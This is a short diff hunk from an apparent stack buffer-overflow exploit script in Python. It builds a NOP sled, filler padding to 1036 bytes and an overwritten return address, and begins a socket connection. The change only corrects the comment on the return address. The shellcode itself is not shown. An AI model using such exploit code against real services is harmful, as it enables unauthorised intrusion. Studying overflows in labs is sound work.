@@ -24,7 +24,7 @@ payload_shell = (
 
 nop_sled = "\x90" * 16  # NOP Sled
 filler = "A" * (1036 - ((len(nop_sled)) + len(payload_shell))) # Filler 1036 Bytes - nop sled Bytes - payload_shell
-eip = "\x6f\x9b\x04\x08"    #0x625011af  Return Address JMP ESP
+eip = "\x6f\x9b\x04\x08"    #0x08049b6f  Return Address JMP EAX
 
 try:
     s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
